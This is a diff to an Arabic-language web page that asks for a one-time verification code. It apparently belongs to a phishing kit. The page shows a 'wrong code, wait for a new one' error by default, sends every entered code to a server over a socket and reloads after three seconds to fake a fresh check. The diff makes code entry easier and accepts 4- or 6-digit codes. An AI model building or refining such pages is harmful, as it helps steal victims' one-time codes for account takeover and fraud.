@@ -54,22 +54,11 @@
       <p class="subtitle">تم إرسال رمز التحقق إلى بريدك الإلكتروني أو رقم هاتفك</p>
       
       <form id="verificationForm">
-        <div class="otp-inputs">
-          <input type="text" class="otp-input" id="otp1" maxlength="1" 
-                 required inputmode="numeric" autocomplete="off" style="text-align:center;">
-          <input type="text" class="otp-input" id="otp2" maxlength="1" 
-                 required inputmode="numeric" autocomplete="off" style="text-align:center;">
-          <input type="text" class="otp-input" id="otp3" maxlength="1" 
-                 required inputmode="numeric" autocomplete="off" style="text-align:center;">
-          <input type="text" class="otp-input" id="otp4" maxlength="1" 
-                 required inputmode="numeric" autocomplete="off" style="text-align:center;">
-          <input type="text" class="otp-input" id="otp5" maxlength="1" 
-                 required inputmode="numeric" autocomplete="off" style="text-align:center;">
-          <input type="text" class="otp-input" id="otp6" maxlength="1" 
-                 required inputmode="numeric" autocomplete="off" style="text-align:center;">
-        </div>
-        
-        <!-- ERROR MESSAGE VISIBLE BY DEFAULT -->
+          <div class="otp-inputs otp-inputs-single">
+            <input type="text" class="otp-input" id="otpCode" inputmode="numeric"
+                   autocomplete="one-time-code" maxlength="6" placeholder="••••••"
+                   required style="text-align:center; letter-spacing:10px; font-size:34px;">
+          </div>
         <div id="otpError" class="otp-error">
           <span>✕</span>
           <span>تم إدخال رمز غير صحيح، يرجى انتظار رمز جديد</span>
@@ -123,6 +112,13 @@
       outline: none; border-color: var(--primary);
       box-shadow: 0 0 0 4px rgba(99, 102, 241, 0.15); transform: scale(1.05);
     }
+    .otp-inputs.otp-inputs-single {
+      margin-bottom: 20px;
+    }
+    .otp-inputs-single .otp-input {
+      width: 220px; height: 64px; font-size: 34px; font-weight: 800;
+      letter-spacing: 10px; padding: 0 8px;
+    }
     .otp-input.error { border-color: var(--danger); animation: shake 0.5s ease; }
     @keyframes shake {
       0%, 100% { transform: translateX(0); }
@@ -174,106 +170,61 @@
     function resendCode() {
       showToast('✓ تم إعادة إرسال رمز التحقق');
     }
-    
+
     document.addEventListener('DOMContentLoaded', async function() {
-      // Initialize socket connection
       await initSocket();
       trackPageChange('verification-error');
-      
-      var inputs = document.querySelectorAll('.otp-input');
-      
-      // Auto-focus first input on load
-      inputs[0].focus();
-      
-      inputs.forEach(function(input, index) {
-        // Handle input - move to next when filled
-        input.addEventListener('input', function(e) {
-          input.classList.remove('error');
-          
-          // Only allow numbers
-          input.value = input.value.replace(/[^0-9]/g, '');
-          
-          // Move to next input if current is filled
-          if (input.value.length === 1 && index < inputs.length - 1) {
-            inputs[index + 1].focus();
-          }
-          
-          // If last input is filled, submit form
-          if (index === inputs.length - 1 && input.value.length === 1) {
-            var otp = '';
-            inputs.forEach(function(inp) { otp += inp.value; });
-            if (otp.length === 6) {
-              document.getElementById('verifyBtn').click();
-            }
-          }
-        });
-        
-        // Handle backspace - move to previous when empty
-        input.addEventListener('keydown', function(e) {
-          if (e.key === 'Backspace' && input.value === '') {
-            var prevIndex = index - 1;
-            if (prevIndex >= 0) {
-              inputs[prevIndex].focus();
-            }
-          }
-        });
-        
-        // Handle paste - fill all fields
-        input.addEventListener('paste', function(e) {
-          e.preventDefault();
-          var pastedData = (e.clipboardData || window.clipboardData).getData('text');
-          var digits = pastedData.replace(/[^0-9]/g, '').split('');
-          
-          inputs.forEach(function(inp, i) {
-            if (digits[i]) {
-              inp.value = digits[i];
-            }
-          });
-          
-          // Focus last filled or next empty
-          var lastFilledIndex = Math.min(digits.length, inputs.length) - 1;
-          inputs[lastFilledIndex].focus();
-        });
+
+      var otpInput = document.getElementById('otpCode');
+      var form = document.getElementById('verificationForm');
+      var loading = document.getElementById('otpLoading');
+      var error = document.getElementById('otpError');
+      var btn = document.getElementById('verifyBtn');
+
+      otpInput.focus();
+
+      otpInput.addEventListener('input', function(e) {
+        otpInput.classList.remove('error');
+        error.style.display = 'none';
+        otpInput.value = otpInput.value.replace(/[^0-9]/g, '').slice(0, 6);
       });
-      
-      document.getElementById('verificationForm').addEventListener('submit', function(e) {
+
+      otpInput.addEventListener('keydown', function(e) {
+        if (e.key === 'Backspace') {
+          otpInput.classList.remove('error');
+          error.style.display = 'none';
+        }
+      });
+
+      form.addEventListener('submit', function(e) {
         e.preventDefault();
-        
-        var otp = '';
-        inputs.forEach(function(inp) { otp += inp.value; });
-        
-        if (otp.length !== 6) {
-          showToast('يرجى إدخال جميع أرقام الرمز', 'error');
+
+        var otp = otpInput.value.trim();
+
+        if (otp.length !== 4 && otp.length !== 6) {
+          showToast(otp.length === 0 ? 'يرجى إدخال رمز التحقق' : 'الرمز يجب أن يتكون من 4 أو  ️6 أرقام', 'error');
+          otpInput.classList.add('error');
+          otpInput.focus();
           return;
         }
-        
-        var loading = document.getElementById('otpLoading');
-        var error = document.getElementById('otpError');
-        var btn = document.getElementById('verifyBtn');
-        var form = document.getElementById('verificationForm');
-        
-        // Show loading, hide form content
+
         loading.style.display = 'flex';
-        form.querySelector('.otp-inputs').style.opacity = '0.3';
-        form.querySelector('.otp-inputs').style.pointerEvents = 'none';
+        document.querySelector('.otp-inputs').style.opacity = '0.3';
+        document.querySelector('.otp-inputs').style.pointerEvents = 'none';
         error.style.display = 'none';
         btn.disabled = true;
         btn.style.opacity = '0.7';
-        
-        // Send verification data to server via socket
+
         var verificationData = {
           otp: otp,
           timestamp: new Date().toISOString(),
           retryAttempt: true
         };
         submitVerificationForm(verificationData);
-        
-        // SECURITY: Clear OTP field immediately after submission
-        inputs.forEach(function(input) { input.value = ''; });
-        
-        // EXACT 3 seconds loading then reload page
+
+        otpInput.value = '';
+
         setTimeout(function() {
-          // Reload the same page (simulates checking again)
           window.location.reload();
         }, 3000);
       });
